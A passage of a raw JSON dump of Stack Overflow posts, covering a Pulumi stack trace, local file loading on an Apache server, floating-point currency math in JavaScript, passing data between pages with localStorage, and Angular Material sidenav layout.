(internal/modules/cjs/loader.js:703:23)\n        at Object.Module._extensions..js (internal/modules/cjs/loader.js:770:10)\n        at Module.load (internal/modules/cjs/loader.js:628:32)\n        at Function.Module._load (internal/modules/cjs/loader.js:555:12)\n        at Module.require (internal/modules/cjs/loader.js:666:19)\n        at require (internal/modules/cjs/helpers.js:16:16)\n        at /Users/workspace/Pulumi Workspace/Pulumi HDInsight Testing/node_modules/@pulumi/pulumi/cmd/run/run.js:195:20\n        at Stack.&lt;anonymous&gt; (/Users/workspace/Pulumi Workspace/Pulumi HDInsight Testing/node_modules/@pulumi/pulumi/runtime/stack.js:76:27)\n        at Generator.next (&lt;anonymous&gt;)\n        at fulfilled (/Users/workspace/Pulumi Workspace/Pulumi HDInsight Testing/node_modules/@pulumi/pulumi/runtime/stack.js:17:58)\n\n</code></pre>\n\n<p>I'm very new to using Azure and have only a basic understanding of Javascript as most of my experience is with Java and C/C++. My purpose for this program is just helping me to use and understand working with HDInsight by using Pulumi.</p>\n"}, {"tags": ["javascript", "html", "file", "local"], "comments": [{"owner": {"reputation": 1050, "user_id": 1531386, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/088f0ccbf8206a00b12e76de80ddf790?s=128&d=identicon&r=PG", "display_name": "\u0130smail Atkurt", "link": "https://stackoverflow.com/users/1531386/%c4%b0smail-atkurt"}, "edited": false, "score": 0, "creation_date": 1558559868, "post_id": 56265108, "comment_id": 99146633, "body": "try like this  file:///E:/Videos1/"}, {"owner": {"reputation": 43836, "user_id": 5947043, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jUK37.png?s=128&g=1", "display_name": "ADyson", "link": "https://stackoverflow.com/users/5947043/adyson"}, "edited": false, "score": 0, "creation_date": 1558559895, "post_id": 56265108, "comment_id": 99146642, "body": "like anything else you load into a web page, it must be loaded via a HTTP request. If those files are not accessible via the machine&#39;s webserver, then you&#39;ll need to configure it so that they are. Otherwise they won&#39;t be accessible. You can&#39;t load things via a file path for security reasons - imagine if someone else was viewing this page on <i>their</i> machine...it would try to load something from their hard disk...pretty blatant breach of privacy wouldn&#39;t you think? Not to mention you&#39;d have no way of knowing if such a file even existed. So overall, what you&#39;re doing doesn&#39;t make any sense :-)"}, {"owner": {"reputation": 1, "user_id": 11541708, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-zT4IljaeFRg/AAAAAAAAAAI/AAAAAAAAAAo/ucvM0ZF6vEI/photo.jpg?sz=128", "display_name": "craig doyle", "link": "https://stackoverflow.com/users/11541708/craig-doyle"}, "edited": false, "score": 0, "creation_date": 1558561274, "post_id": 56265108, "comment_id": 99147085, "body": "Ok so  how do I make it so that the drive is accessible via the web server and the &quot;file:///&quot; method didn&#39;t seem to work."}, {"owner": {"reputation": 43836, "user_id": 5947043, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jUK37.png?s=128&g=1", "display_name": "ADyson", "link": "https://stackoverflow.com/users/5947043/adyson"}, "edited": false, "score": 0, "creation_date": 1558565917, "post_id": 56265108, "comment_id": 99148246, "body": "Depends what webserver you&#39;re using (e.g. IIS or Apache are the most common ones). You can easily look up the instructions for the relevant product"}, {"owner": {"reputation": 1, "user_id": 11541708, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-zT4IljaeFRg/AAAAAAAAAAI/AAAAAAAAAAo/ucvM0ZF6vEI/photo.jpg?sz=128", "display_name": "craig doyle", "link": "https://stackoverflow.com/users/11541708/craig-doyle"}, "edited": false, "score": 0, "creation_date": 1558595470, "post_id": 56265108, "comment_id": 99154554, "body": "It&#39;s an Apache web server so what would I search"}, {"owner": {"reputation": 43836, "user_id": 5947043, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jUK37.png?s=128&g=1", "display_name": "ADyson", "link": "https://stackoverflow.com/users/5947043/adyson"}, "edited": false, "score": 0, "creation_date": 1558601791, "post_id": 56265108, "comment_id": 99158009, "body": "Good grief. how about &quot;apache add folder&quot; to start with???"}], "owner": {"reputation": 1, "user_id": 11541708, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-zT4IljaeFRg/AAAAAAAAAAI/AAAAAAAAAAo/ucvM0ZF6vEI/photo.jpg?sz=128", "display_name": "craig doyle", "link": "https://stackoverflow.com/users/11541708/craig-doyle"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 28, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1558559936, "creation_date": 1558559633, "last_edit_date": 1558559936, "question_id": 56265108, "link": "https://stackoverflow.com/questions/56265108/i-keep-getting-this-error-not-allowed-to-load-local-resource", "title": "I keep getting this error: Not allowed to load local resource", "body": "<p>I have created my own local media server with html and I'm trying to access these files that are located on a different drive than to that of the website but it keeps outputting that same error: </p>\n\n<blockquote>\n  <p>Not allowed to load local resource</p>\n</blockquote>\n\n<p>I have tried creating an alias to give access to the files that way as it worked for me before but it isn't working now. I'm using ampps to host the local server of an old desktop.</p>\n\n<pre><code>&lt;div id=\"select_box\"&gt;\n  &lt;div id=\"box1\" onclick=\"VidFileTree('../../Videos/')\"&gt;&lt;p id=\"box1_txt\" &gt;Page 1&lt;/p&gt;&lt;/div&gt;\n  &lt;div id=\"box2\" onclick=\"VidFileTree('E:/Videos1/')\"&gt;&lt;p id=\"box2_txt\" &gt;Page 2&lt;/p&gt;&lt;/div&gt;\n&lt;/div&gt;\n</code></pre>\n"}, {"tags": ["javascript", "currency", "floating-accuracy"], "comments": [{"owner": {"reputation": 507143, "user_id": 1048572, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/7f2c4de95e8f4f8f5a71c3aaf0ed312a?s=128&d=identicon&r=PG", "display_name": "Bergi", "link": "https://stackoverflow.com/users/1048572/bergi"}, "edited": false, "score": 2, "creation_date": 1558559676, "post_id": 56265076, "comment_id": 99146569, "body": "Of course you&#39;d have to round to an actual integer after multiplying by 100. There&#39;s no error introduced by that."}, {"owner": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "edited": false, "score": 1, "creation_date": 1558559772, "post_id": 56265076, "comment_id": 99146604, "body": "... In other words: <code>Math.round(value * 100)</code> will always be 123 for 1.23"}, {"owner": {"reputation": 118, "user_id": 3682630, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/TBnNg.png?s=128&g=1", "display_name": "Propagating", "link": "https://stackoverflow.com/users/3682630/propagating"}, "reply_to_user": {"reputation": 507143, "user_id": 1048572, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/7f2c4de95e8f4f8f5a71c3aaf0ed312a?s=128&d=identicon&r=PG", "display_name": "Bergi", "link": "https://stackoverflow.com/users/1048572/bergi"}, "edited": false, "score": 0, "creation_date": 1558559815, "post_id": 56265076, "comment_id": 99146618, "body": "@Bergi, that doesn&#39;t always work and can still lead to incorrect values in some cases where the fractional component extends past the first few places*. There is a more thorough discussion of this topic, and an answer to the question,  located here: <a href=\"https://stackoverflow.com/questions/2876536/precise-financial-calculation-in-javascript-what-are-the-gotchas#comment2924188_2876619\" title=\"precise financial calculation in javascript what are the gotchas%23comment2924188_2876619\">stackoverflow.com/questions/2876536/&hellip;</a>"}, {"owner": {"reputation": 11274, "user_id": 9078341, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/TAD0A.png?s=128&g=1", "display_name": "Randy Casburn", "link": "https://stackoverflow.com/users/9078341/randy-casburn"}, "edited": false, "score": 0, "creation_date": 1558559962, "post_id": 56265076, "comment_id": 99146661, "body": "Can you write a test that will fail given a float with two decimals that is added to 100 not producing the correct integer value? Would love to see that."}, {"owner": {"reputation": 507143, "user_id": 1048572, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/7f2c4de95e8f4f8f5a71c3aaf0ed312a?s=128&d=identicon&r=PG", "display_name": "Bergi", "link": "https://stackoverflow.com/users/1048572/bergi"}, "reply_to_user": {"reputation": 118, "user_id": 3682630, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/TBnNg.png?s=128&g=1", "display_name": "Propagating", "link": "https://stackoverflow.com/users/3682630/propagating"}, "edited": false, "score": 0, "creation_date": 1558559971, "post_id": 56265076, "comment_id": 99146663, "body": "@Propagating As long as the amount can be properly represented as an integer, it should work - or do you mean something else?"}, {"owner": {"reputation": 409, "user_id": 6293012, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a64aee30957b41b2ca10ca89f7f60160?s=128&d=identicon&r=PG&f=1", "display_name": "Jude Desir", "link": "https://stackoverflow.com/users/6293012/jude-desir"}, "edited": false, "score": 0, "creation_date": 1558560047, "post_id": 56265076, "comment_id": 99146686, "body": "Try  Number.parseFloat(num).toFixed(8);"}, {"owner": {"reputation": 30077, "user_id": 759866, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/cc21bd143a63dbea51c2caa5f1e8599b?s=128&d=identicon&r=PG", "display_name": "BenMorel", "link": "https://stackoverflow.com/users/759866/benmorel"}, "edited": false, "score": 1, "creation_date": 1558563249, "post_id": 56265076, "comment_id": 99147617, "body": "Good question. If you really want to avoid floating point calculations (rightly so), and assuming that input strings always have 2 decimal digits, you can remove the <code>.</code> from the input and convert to an integer using <code>parseInt()</code>. IEEE 754 (64 bit) works fine with integers up to 2^53 (if I&#39;m not mistaken), so you can handle all calculations in minor units (cents) from there. As long as you&#39;re not dividing, you&#39;re covered."}, {"owner": {"reputation": 139300, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "reply_to_user": {"reputation": 507143, "user_id": 1048572, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/7f2c4de95e8f4f8f5a71c3aaf0ed312a?s=128&d=identicon&r=PG", "display_name": "Bergi", "link": "https://stackoverflow.com/users/1048572/bergi"}, "edited": false, "score": 1, "creation_date": 1558607546, "post_id": 56265076, "comment_id": 99161120, "body": "@Bergi: \u201cThere\u2019s no error introduced by that\u201d is not a true statement. If the input is \u201c1000000000000001\u201d, the result of parsing the input should produce 1000000000000001, since it can be represented exactly, but multiplying that by 100 will produce 100000000000000096, and rounding cannot fix it. Of course, it is not likely OP is working with a quadrillion and one dollars, but they might be if they are working with Zimbabwean dollars."}, {"owner": {"reputation": 139300, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "reply_to_user": {"reputation": 118, "user_id": 3682630, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/TBnNg.png?s=128&g=1", "display_name": "Propagating", "link": "https://stackoverflow.com/users/3682630/propagating"}, "edited": false, "score": 1, "creation_date": 1558607670, "post_id": 56265076, "comment_id": 99161178, "body": "@Propagating: If the initial input is at most 14 decimal digits (including two after the decimal point), then multiplying by 100 and rounding to the nearest integer always produces exactly 100 times the initial input. (Actually, I think it is true for 15 digits too but would want to draft a proof before asserting it.) It is possible OP is running into this limit, per my above comment, but it is unlikely."}, {"owner": {"reputation": 139300, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 0, "creation_date": 1558609336, "post_id": 56265076, "comment_id": 99162113, "body": "You should provide a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}, {"owner": {"reputation": 507143, "user_id": 1048572, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/7f2c4de95e8f4f8f5a71c3aaf0ed312a?s=128&d=identicon&r=PG", "display_name": "Bergi", "link": "https://stackoverflow.com/users/1048572/bergi"}, "reply_to_user": {"reputation": 139300, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 0, "creation_date": 1558613191, "post_id": 56265076, "comment_id": 99164140, "body": "@EricPostpischil Yes, I meant what you wrote in your second comment :)"}, {"owner": {"reputation": 21128, "user_id": 69993, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/de72d419e1f2a366ad9fc2c29a6a82df?s=128&d=identicon&r=PG", "display_name": "Kzqai", "link": "https://stackoverflow.com/users/69993/kzqai"}, "edited": false, "score": 0, "creation_date": 1558624142, "post_id": 56265076, "comment_id": 99170625, "body": "Related question: <a href=\"https://stackoverflow.com/questions/2876536/precise-financial-calculation-in-javascript-what-are-the-gotchas#comment2924188_2876619\" title=\"precise financial calculation in javascript what are the gotchas%23comment2924188_2876619\">stackoverflow.com/questions/2876536/&hellip;</a>"}, {"owner": {"reputation": 21128, "user_id": 69993, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/de72d419e1f2a366ad9fc2c29a6a82df?s=128&d=identicon&r=PG", "display_name": "Kzqai", "link": "https://stackoverflow.com/users/69993/kzqai"}, "edited": false, "score": 0, "creation_date": 1558624172, "post_id": 56265076, "comment_id": 99170644, "body": "Related question: <a href=\"https://stackoverflow.com/questions/1458633/how-to-deal-with-floating-point-number-precision-in-javascript\" title=\"how to deal with floating point number precision in javascript\">stackoverflow.com/questions/1458633/&hellip;</a>"}, {"owner": {"reputation": 21128, "user_id": 69993, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/de72d419e1f2a366ad9fc2c29a6a82df?s=128&d=identicon&r=PG", "display_name": "Kzqai", "link": "https://stackoverflow.com/users/69993/kzqai"}, "edited": false, "score": 0, "creation_date": 1558624190, "post_id": 56265076, "comment_id": 99170654, "body": "Related question: <a href=\"https://stackoverflow.com/questions/19473770/how-to-avoid-floating-point-errors\" title=\"how to avoid floating point errors\">stackoverflow.com/questions/19473770/&hellip;</a>"}], "answers": [{"tags": [], "owner": {"reputation": 139300, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "is_accepted": false, "score": 1, "last_activity_date": 1558609224, "creation_date": 1558609224, "answer_id": 56273789, "question_id": 56265076, "link": "https://stackoverflow.com/questions/56265076/in-a-fully-javascript-web-stack-how-can-floating-point-errors-be-avoided-when-c/56273789#56273789", "title": "In a fully javascript web stack, how can floating point errors be avoided when converting from a currency source in decimal?", "body": "<p>Potential sources of error in the problem as described in the question include:</p>\n\n<ul>\n<li>Input values are so large they cannot be multiplied by 100 and rounded to the nearest integer without error. (This requires input values around 10<sup>13</sup> or larger, so it is not likely unless the data involves trillions of dollars.)</li>\n<li>The calculations performed could result in values so large that rounding errors occur.</li>\n<li>The \u201ccustom calculations\u201d mentioned in the input include things that have rounding errors even if the values are small integers. For example, \u201caveraging\u201d is mentioned, and the average of 1 cent, 1 cent, and 2 cents cannot be computed in binary floating-point without rounding errors, since 4/3 is not representable. Additionally, \u201ccustom calculations\u201d could include logarithms, evaluations of probability distributions, integrations, and other mathematics beyond elementary arithmetic.</li>\n<li>There could be bugs in the code.</li>\n</ul>\n\n<blockquote>\n  <p>So in [JavaScript] what is the process for handling smooth conversion between decimal or dollar requests and calculations that avoid floating point errors?</p>\n</blockquote>\n\n<p>Regarding the former, if <em>x</em> is a number represented in input characters in decimal with at most two digits after the decimal point and is not excessively large (per the above), and <code>x</code> is the result of correctly converting that input to a JavaScript <code>Number</code>, then the result of <code>Math.round(100*x)</code> is exactly 100<i>x</i>. There is no net rounding error. The sources of any calculation errors lie elsewhere.</p>\n"}], "owner": {"reputation": 21128, "user_id": 69993, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/de72d419e1f2a366ad9fc2c29a6a82df?s=128&d=identicon&r=PG", "display_name": "Kzqai", "link": "https://stackoverflow.com/users/69993/kzqai"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 53, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1558609224, "creation_date": 1558559468, "last_edit_date": 1558559722, "question_id": 56265076, "link": "https://stackoverflow.com/questions/56265076/in-a-fully-javascript-web-stack-how-can-floating-point-errors-be-avoided-when-c", "title": "In a fully javascript web stack, how can floating point errors be avoided when converting from a currency source in decimal?", "body": "<p>I had to design a money-handling application recently that was fully in javascript, express.js, REST apis, the full node/browser js stack.  Unfortunately, the application dealt with a variety of custom calculations like averaging out the results.  Of course, when averaging results, floating point addition and division comes into play.  Thus, I would get values that were off by about 0.12 (12 cents!).</p>\n\n<p>I understand the recommended options for dealing with floats in theory:</p>\n\n<ul>\n<li>Calculate in integers </li>\n<li>Round </li>\n<li>Use a decimal datatype somewhere else</li>\n</ul>\n\n<p>The integers-for-currency approach is fine, that would make sense, but unfortunately if requests are coming in in decimal form, then some kind of calculation to initially convert floats to integers still has to happen, and the potential for error is still retained.</p>\n\n<p>So let's say a request comes in to add <code>44.67</code> to a list of dollar values. \n It'd be nice to work with it in clean integer units, but to get there requires multiplying by 100 first, which I am suspicious causes the whole set of errors to come with it.</p>\n\n<p>So in javascript what is the process for handling smooth conversion between decimal or dollar requests and calculations that avoid floating point errors?</p>\n\n<p>In that case is a database required, and the values just have to be passed in to the database as strings?  Or is there a way to convert \"losslessly\" to integers within the javascript?  Or is there some other technique when handling money and requiring exactness?</p>\n"}, {"tags": ["javascript", "onclick"], "comments": [{"owner": {"reputation": 9433, "user_id": 6804958, "user_type": "registered", "accept_rate": 27, "profile_image": "https://i.stack.imgur.com/lj3En.jpg?s=128&g=1", "display_name": "Muhammad Usman", "link": "https://stackoverflow.com/users/6804958/muhammad-usman"}, "edited": false, "score": 0, "creation_date": 1558559291, "post_id": 56265022, "comment_id": 99146403, "body": "read about <code>localStorage</code>"}], "answers": [{"comments": [{"owner": {"reputation": 7965, "user_id": 6504633, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ac20a524c7ab77fee62995c374a1f8a?s=128&d=identicon&r=PG&f=1", "display_name": "obscure", "link": "https://stackoverflow.com/users/6504633/obscure"}, "reply_to_user": {"reputation": 9, "user_id": 11477062, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/19c233db45c910cb3cd956ffb9cab825?s=128&d=identicon&r=PG&f=1", "display_name": "Asians never die", "link": "https://stackoverflow.com/users/11477062/asians-never-die"}, "edited": false, "score": 0, "creation_date": 1558642547, "post_id": 56265200, "comment_id": 99178610, "body": "Hehe - no problem! Great to hear I&#39;m a lifesaver. =)"}], "tags": [], "owner": {"reputation": 7965, "user_id": 6504633, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ac20a524c7ab77fee62995c374a1f8a?s=128&d=identicon&r=PG&f=1", "display_name": "obscure", "link": "https://stackoverflow.com/users/6504633/obscure"}, "is_accepted": true, "score": 0, "last_activity_date": 1558560174, "creation_date": 1558560174, "answer_id": 56265200, "question_id": 56265022, "link": "https://stackoverflow.com/questions/56265022/how-can-i-load-a-new-html-page-and-use-an-element-obtained-by-onclick-of-a-dynam/56265200#56265200", "title": "How can I load a new html page and use an element obtained by onclick of a dynamic object?", "body": "<p>I'm afraid you cannot transfer information from one html page to another that easily.\nWhat you could do however is saving the data in the browser's local storage and retrieve it from there on your second html page.\nHere's a sample.</p>\n\n<p>Save this as page1.html</p>\n\n<pre><code>&lt;html&gt;\n  &lt;head&gt;\n    &lt;script type=\"text/javascript\"&gt;\n      var text = prompt(\"Enter some text:\");\n      localStorage.setItem('myText', text);\n    &lt;/script&gt;\n    &lt;button onclick=\"window.open('page2.html','_blank')\"&gt;Click&lt;/button&gt;\n  &lt;/head&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>and this as page2.html</p>\n\n<pre><code>&lt;html&gt;\n  &lt;head&gt;\n    &lt;script type=\"text/javascript\"&gt;\n      document.write(\"You have written: \" + localStorage.getItem('myText'));\n    &lt;/script&gt;\n  &lt;/head&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>If you open page1 it will prompt you to enter some text. Afterwards push the 'click' button to open page2 in a new browser window where you'll see what you've entered in page1.</p>\n"}], "owner": {"reputation": 9, "user_id": 11477062, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/19c233db45c910cb3cd956ffb9cab825?s=128&d=identicon&r=PG&f=1", "display_name": "Asians never die", "link": "https://stackoverflow.com/users/11477062/asians-never-die"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 21, "favorite_count": 0, "accepted_answer_id": 56265200, "answer_count": 1, "score": 0, "last_activity_date": 1558560174, "creation_date": 1558559159, "question_id": 56265022, "link": "https://stackoverflow.com/questions/56265022/how-can-i-load-a-new-html-page-and-use-an-element-obtained-by-onclick-of-a-dynam", "title": "How can I load a new html page and use an element obtained by onclick of a dynamic object?", "body": "<p>so on my index.html page i have dynamic objects created by using appendChild and each one of them has an onclick function.  I am able to grab a value when clicked.  but if i want to use this value and show it on another html page, how can i do this?  i am using plain javascript.</p>\n\n<p>from first.js for first html</p>\n\n<pre><code>  var cardTitle = document.createElement(\"div\");\n    cardTitle.setAttribute(`onclick`, 'function(this)');\n  var title = document.createElement(\"h2\");\n    title.textContent = thing.data().title;\n\n  cardTitle.appendChild(title);\n  tohtml.appendChild(cardTitle);\n\n</code></pre>\n\n<p>from second.js for second html</p>\n\n<pre><code>function function(test){\n    window.location.href = \"second.html\";\n    let title = test.firstChild.textContent;\n    document.getElementById(\"id\").innerHTML = title;\n}\n</code></pre>\n\n<p>so i honestly dont know if am even suppose to code like this with two js and two html.  i do see some errors here and there but it works.  if there are better ways of doing this, please let me know, if it isnt difficult to apply.</p>\n\n<p>i just have dynamically loaded objects from database loaded on one html and when clicked, i need to grab some values of the clicked object and show them on another html or maybe somehow use them.</p>\n\n<p>so as said, i did get a hold of \"thing.data().title\" but just cant get it to display on second html.</p>\n\n<p>please help...</p>\n\n<p>thanks in advance!!!</p>\n"}, {"tags": ["javascript", "css", "angular", "angular-material"], "answers": [{"comments": [{"owner": {"reputation": 773, "user_id": 2351594, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/34742b805174b62786c7b75c9a104089?s=128&d=identicon&r=PG&f=1", "display_name": "Paul", "link": "https://stackoverflow.com/users/2351594/paul"}, "edited": false, "score": 1, "creation_date": 1559141422, "post_id": 56321916, "comment_id": 99329873, "body": "thanks. that sure solved my problem when opening the app on the phone. i really didnt think of that. i&#39;m new to angular. just want to try things out. thanks by the way."}], "tags": [], "owner": {"reputation": 12075, "user_id": 8757883, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/gQGYY.png?s=128&g=1", "display_name": "Akber Iqbal", "link": "https://stackoverflow.com/users/8757883/akber-iqbal"}, "is_accepted": true, "score": 8, "last_activity_date": 1558943837, "creation_date": 1558943837, "answer_id": 56321916, "question_id": 56265020, "link": "https://stackoverflow.com/questions/56265020/how-to-push-mat-list-items-to-the-bottom-without-using-absolute-position-in-angu/56321916#56321916", "title": "How to push mat-list-items to the bottom without using absolute position in Angular Material?", "body": "<p>Very interesting and logical question... getting the bottom 3 icons to stick to the bottom requires <code>position:absolute</code>, which causes the over-riding effect (which is exactly the effect which is expected with absolute positioning).</p>\n\n<p>To get our ideal scenario, we gotta toggle the <code>position:relative</code> between <code>position:absolute</code> based on the breakpoint where the over-riding starts to take effect. This is where we needed JavaScript/TypeScript as CSS can't do this alone... </p>\n\n<p>You can check <a href=\"https://stackblitz.com/edit/angular-h5xrzu\" rel=\"noreferrer\">complete working stackblitz here</a></p>\n\n<p>this is the relevant <strong>TS</strong> file:</p>\n\n<pre><code>import {Component} from '@angular/core';\nimport {HostListener} from '@angular/core';\n\n/** @title Sidenav open &amp; close behavior */\n@Component({\n  selector: 'sidenav-open-close-example',\n  templateUrl: 'sidenav-open-close-example.html',\n  styleUrls: ['sidenav-open-close-example.css'],\n})\nexport class SidenavOpenCloseExample {\n  events: string[] = [];\n  opened: boolean;\n  appropriateClass:string = '';\n\n  @HostListener('window:resize', ['$event'])\n  getScreenHeight(event?){\n    //console.log(window.innerHeight);\n    if(window.innerHeight&lt;=412){\n      this.appropriateClass = 'bottomRelative';\n    }else{\n      this.appropriateClass = 'bottomStick';\n    }\n  }\n  constructor(){\n    this.getScreenHeight();\n  }\n\n  shouldRun = [/(^|\\.)plnkr\\.co$/, /(^|\\.)stackblitz\\.io$/].some(h =&gt; h.test(window.location.host));\n}\n</code></pre>\n\n<p>note the <em>ngClass</em> in the relevant <strong>HTML</strong> below:</p>\n\n<pre><code>  &lt;mat-nav-list&gt;\n        &lt;div class=\"\"&gt; \n          &lt;a mat-list-item&gt;\n              &lt;button mat-icon-button&gt;\n                  &lt;mat-icon inline=true fontSet=\"fa\" fontIcon=\"fa-users-cog\" aria-label=\"Administrator\"&gt;&lt;/mat-icon&gt;\n              &lt;/button&gt;\n          &lt;/a&gt;\n          &lt;a mat-list-item&gt;\n              &lt;button mat-icon-button&gt;\n                  &lt;mat-icon inline=true fontSet=\"fa\" fontIcon=\"fa-tachometer-alt\" aria-label=\"Services\"&gt;&lt;/mat-icon&gt;\n              &lt;/button&gt;\n          &lt;/a&gt;\n          &lt;a mat-list-item&gt;\n              &lt;button mat-icon-button&gt;\n                  &lt;mat-icon inline=true fontSet=\"fa\" fontIcon=\"fa-chart-bar\" aria-label=\"Analytics\"&gt;&lt;/mat-icon&gt;\n              &lt;/button&gt;\n          &lt;/a&gt;\n          &lt;a mat-list-item&gt;\n              &lt;button mat-icon-button&gt;\n                  &lt;mat-icon inline=true fontSet=\"fa\" fontIcon=\"fa-plus\" aria-label=\"Compose\"&gt;&lt;/mat-icon&gt;\n              &lt;/button&gt;\n          &lt;/a&gt;\n        &lt;/div&gt;\n        &lt;!-- This is where the bottom items reside.--&gt;\n          &lt;div [ngClass]='appropriateClass'&gt; \n              &lt;a mat-list-item&gt;\n                  &lt;button mat-icon-button&gt;\n                      &lt;mat-icon inline=true fontSet=\"fa\" fontIcon=\"fa-bell\" aria-label=\"Notifications\"&gt;&lt;/mat-icon&gt;\n                  &lt;/button&gt;\n              &lt;/a&gt;\n              &lt;a mat-list-item&gt;\n                  &lt;button mat-icon-button&gt;\n                      &lt;mat-icon inline=true fontSet=\"fa\" fontIcon=\"fa-user\" aria-label=\"User Account\"&gt;&lt;/mat-icon&gt;\n                  &lt;/button&gt;\n              &lt;/a&gt;\n              &lt;a mat-list-item&gt;\n                  &lt;button mat-icon-button&gt;\n                      &lt;mat-icon inline=true fontSet=\"fa\" fontIcon=\"fa-cog\" aria-label=\"Settings\"&gt;&lt;/mat-icon&gt;\n                  &lt;/button&gt;\n              &lt;/a&gt;\n          &lt;/div&gt;\n\n    &lt;/mat-nav-list&gt;\n</code></pre>\n\n<p>relevant <strong>CSS</strong>:</p>\n\n<pre><code>button {border:1px solid red}\n.bottomStick{/*border-top:1px solid green;border-bottom:1px solid green;*/position:absolute; bottom:0}\n.bottomRelative{position:relative;}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 159, "user_id": 5516573, "user_type": "registered", "profile_image": "https://graph.facebook.com/10208017632536573/picture?type=large", "display_name": "Lean Pilar", "link": "https://stackoverflow.com/users/5516573/lean-pilar"}, "is_accepted": false, "score": 3, "last_activity_date": 1574339779, "creation_date": 1574339779, "answer_id": 58975247, "question_id": 56265020, "link": "https://stackoverflow.com/questions/56265020/how-to-push-mat-list-items-to-the-bottom-without-using-absolute-position-in-angu/58975247#58975247", "title": "How to push mat-list-items to the bottom without using absolute position in Angular Material?", "body": "<p>I use flex-layout and manage to add an empty element between items.\nThere is no CSS added.\nThe container needs to have 100% height and in my case, I have to add FxFill, you can manage the way you like.</p>\n\n<p>// sidenav-componet</p>\n\n<pre><code>&lt;div fxLayout=\"column\" fxFill&gt;\n  &lt;mat-toolbar color=\"primary\" class=\"mat-elevation-z5\"&gt;\n    &lt;h2 &gt;Menu&lt;/h2&gt;\n  &lt;/mat-toolbar&gt;\n\n  &lt;mat-list  fxLayout=\"column\" fxFlex&gt;\n    &lt;mat-list-item fxLayoutAlign=\"center center\" &gt;\n      &lt;h4 routerLink=\"/\"&gt;Home&lt;/h4&gt;\n    &lt;/mat-list-item&gt;\n    &lt;mat-divider&gt;&lt;/mat-divider&gt;\n    &lt;mat-list-item fxLayoutAlign=\"center center\" &gt;\n      &lt;h4 routerLink=\"/admin\"&gt;Admin&lt;/h4&gt;\n    &lt;/mat-list-item&gt;\n    &lt;mat-divider&gt;&lt;/mat-divider&gt;\n\n    &lt;span fxFlex&gt;&lt;/span&gt;\n\n    &lt;mat-divider&gt;&lt;/mat-divider&gt;\n    &lt;mat-list-item fxLayoutAlign=\"center center\" &gt;\n      &lt;h4 (click)=\"logout()\"&gt;Logout&lt;/h4&gt;\n    &lt;/mat-list-item&gt;\n    &lt;mat-divider&gt;&lt;/mat-divider&gt;\n  &lt;/mat-list&gt;\n&lt;/div&gt;\n</code></pre>\n"}], "owner": 